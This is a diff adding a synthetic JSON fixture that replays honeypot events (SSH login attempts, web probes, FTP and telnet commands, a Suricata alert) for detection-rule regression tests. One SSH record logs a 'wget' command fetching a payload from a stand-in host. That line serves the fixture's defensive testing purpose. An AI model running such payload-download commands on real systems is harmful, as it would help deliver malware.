@@ -1,0 +1,351 @@
+{
+  "corpus_version": "1.0",
+  "purpose": "Deterministic synthetic attack replay for regression tests; documentation/test data only.",
+  "synthetic": true,
+  "protocols": [
+    "ssh",
+    "web",
+    "ftp",
+    "telnet",
+    "suricata"
+  ],
+  "expected_rule_ids": [
+    "multiple_auth_failures",
+    "download_attempt",
+    "web_scanning",
+    "suricata_high_severity"
+  ],
+  "records": [
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "ssh",
+      "payload": {
+        "id": "10000000-0000-4000-8000-000000000001",
+        "timestamp": "2026-09-23T10:00:00+00:00",
+        "honeypot": "ssh-decoy-01",
+        "event_type": "credential",
+        "severity": "medium",
+        "observed": {
+          "source_ip": "203.0.113.10",
+          "source_port": 40000,
+          "destination_port": 22,
+          "service": "ssh",
+          "protocol": "tcp",
+          "credential": {
+            "username": "user0",
+            "password": "synthetic-secret-0"
+          }
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "ssh",
+      "payload": {
+        "id": "10000000-0000-4000-8000-000000000002",
+        "timestamp": "2026-09-23T10:01:00+00:00",
+        "honeypot": "ssh-decoy-01",
+        "event_type": "credential",
+        "severity": "medium",
+        "observed": {
+          "source_ip": "203.0.113.10",
+          "source_port": 40001,
+          "destination_port": 22,
+          "service": "ssh",
+          "protocol": "tcp",
+          "credential": {
+            "username": "user1",
+            "password": "synthetic-secret-1"
+          }
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "ssh",
+      "payload": {
+        "id": "10000000-0000-4000-8000-000000000003",
+        "timestamp": "2026-09-23T10:02:00+00:00",
+        "honeypot": "ssh-decoy-01",
+        "event_type": "credential",
+        "severity": "medium",
+        "observed": {
+          "source_ip": "203.0.113.10",
+          "source_port": 40002,
+          "destination_port": 22,
+          "service": "ssh",
+          "protocol": "tcp",
+          "credential": {
+            "username": "user2",
+            "password": "synthetic-secret-2"
+          }
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "ssh",
+      "payload": {
+        "id": "10000000-0000-4000-8000-000000000004",
+        "timestamp": "2026-09-23T10:03:00+00:00",
+        "honeypot": "ssh-decoy-01",
+        "event_type": "credential",
+        "severity": "medium",
+        "observed": {
+          "source_ip": "203.0.113.10",
+          "source_port": 40003,
+          "destination_port": 22,
+          "service": "ssh",
+          "protocol": "tcp",
+          "credential": {
+            "username": "user3",
+            "password": "synthetic-secret-3"
+          }
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "ssh",
+      "payload": {
+        "id": "10000000-0000-4000-8000-000000000005",
+        "timestamp": "2026-09-23T10:04:00+00:00",
+        "honeypot": "ssh-decoy-01",
+        "event_type": "credential",
+        "severity": "medium",
+        "observed": {
+          "source_ip": "203.0.113.10",
+          "source_port": 40004,
+          "destination_port": 22,
+          "service": "ssh",
+          "protocol": "tcp",
+          "credential": {
+            "username": "user4",
+            "password": "synthetic-secret-4"
+          }
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "ssh",
+      "payload": {
+        "id": "10000000-0000-4000-8000-000000000006",
+        "timestamp": "2026-09-23T10:05:00+00:00",
+        "honeypot": "ssh-decoy-01",
+        "event_type": "command",
+        "severity": "low",
+        "observed": {
+          "source_ip": "203.0.113.10",
+          "destination_port": 22,
+          "service": "ssh",
+          "protocol": "tcp",
+          "command": "wget http://example.invalid/payload"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "web",
+      "payload": {
+        "id": "20000000-0000-4000-8000-000000000001",
+        "timestamp": "2026-09-23T10:10:00+00:00",
+        "honeypot": "web-decoy-01",
+        "event_type": "web.request",
+        "severity": "info",
+        "observed": {
+          "source_ip": "198.51.100.20",
+          "destination_port": 80,
+          "service": "http",
+          "protocol": "tcp",
+          "path": "/synthetic-probe-0"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "web",
+      "payload": {
+        "id": "20000000-0000-4000-8000-000000000002",
+        "timestamp": "2026-09-23T10:11:00+00:00",
+        "honeypot": "web-decoy-01",
+        "event_type": "web.request",
+        "severity": "info",
+        "observed": {
+          "source_ip": "198.51.100.20",
+          "destination_port": 80,
+          "service": "http",
+          "protocol": "tcp",
+          "path": "/synthetic-probe-1"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "web",
+      "payload": {
+        "id": "20000000-0000-4000-8000-000000000003",
+        "timestamp": "2026-09-23T10:12:00+00:00",
+        "honeypot": "web-decoy-01",
+        "event_type": "web.request",
+        "severity": "info",
+        "observed": {
+          "source_ip": "198.51.100.20",
+          "destination_port": 80,
+          "service": "http",
+          "protocol": "tcp",
+          "path": "/synthetic-probe-2"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "web",
+      "payload": {
+        "id": "20000000-0000-4000-8000-000000000004",
+        "timestamp": "2026-09-23T10:13:00+00:00",
+        "honeypot": "web-decoy-01",
+        "event_type": "web.request",
+        "severity": "info",
+        "observed": {
+          "source_ip": "198.51.100.20",
+          "destination_port": 80,
+          "service": "http",
+          "protocol": "tcp",
+          "path": "/synthetic-probe-3"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "web",
+      "payload": {
+        "id": "20000000-0000-4000-8000-000000000005",
+        "timestamp": "2026-09-23T10:14:00+00:00",
+        "honeypot": "web-decoy-01",
+        "event_type": "web.request",
+        "severity": "info",
+        "observed": {
+          "source_ip": "198.51.100.20",
+          "destination_port": 80,
+          "service": "http",
+          "protocol": "tcp",
+          "path": "/synthetic-probe-4"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "web",
+      "payload": {
+        "id": "20000000-0000-4000-8000-000000000006",
+        "timestamp": "2026-09-23T10:15:00+00:00",
+        "honeypot": "web-decoy-01",
+        "event_type": "web.request",
+        "severity": "info",
+        "observed": {
+          "source_ip": "198.51.100.20",
+          "destination_port": 80,
+          "service": "http",
+          "protocol": "tcp",
+          "path": "/synthetic-probe-5"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "web",
+      "payload": {
+        "id": "20000000-0000-4000-8000-000000000007",
+        "timestamp": "2026-09-23T10:16:00+00:00",
+        "honeypot": "web-decoy-01",
+        "event_type": "web.request",
+        "severity": "info",
+        "observed": {
+          "source_ip": "198.51.100.20",
+          "destination_port": 80,
+          "service": "http",
+          "protocol": "tcp",
+          "path": "/synthetic-probe-6"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "web",
+      "payload": {
+        "id": "20000000-0000-4000-8000-000000000008",
+        "timestamp": "2026-09-23T10:17:00+00:00",
+        "honeypot": "web-decoy-01",
+        "event_type": "web.request",
+        "severity": "info",
+        "observed": {
+          "source_ip": "198.51.100.20",
+          "destination_port": 80,
+          "service": "http",
+          "protocol": "tcp",
+          "path": "/synthetic-probe-7"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "ftp",
+      "payload": {
+        "id": "30000000-0000-4000-8000-000000000001",
+        "timestamp": "2026-09-23T10:20:00+00:00",
+        "honeypot": "legacy-decoy-01",
+        "event_type": "ftp.command",
+        "severity": "info",
+        "observed": {
+          "source_ip": "192.0.2.30",
+          "destination_port": 21,
+          "service": "ftp",
+          "protocol": "tcp",
+          "command": "USER synthetic"
+        }
+      }
+    },
+    {
+      "kind": "aegis_event",
+      "protocol_fixture": "telnet",
+      "payload": {
+        "id": "40000000-0000-4000-8000-000000000001",
+        "timestamp": "2026-09-23T10:21:00+00:00",
+        "honeypot": "legacy-decoy-01",
+        "event_type": "telnet.command",
+        "severity": "info",
+        "observed": {
+          "source_ip": "192.0.2.40",
+          "destination_port": 23,
+          "service": "telnet",
+          "protocol": "tcp",
+          "command": "uname -a"
+        }
+      }
+    },
+    {
+      "kind": "suricata_eve",
+      "protocol_fixture": "suricata",
+      "sensor_id": "suricata-01",
+      "payload": {
+        "timestamp": "2026-09-23T10:22:00+00:00",
+        "event_type": "alert",
+        "src_ip": "198.51.100.50",
+        "src_port": 44444,
+        "dest_ip": "192.0.2.50",
+        "dest_port": 445,
+        "proto": "TCP",
+        "app_proto": "smb",
+        "flow_id": 123456789,
+        "alert": {
+          "signature": "AEGIS synthetic high severity fixture",
+          "signature_id": 900001,
+          "category": "Synthetic Test",
+          "severity": 1,
+          "action": "allowed"
+        }
+      }
+    }
+  ]
+}
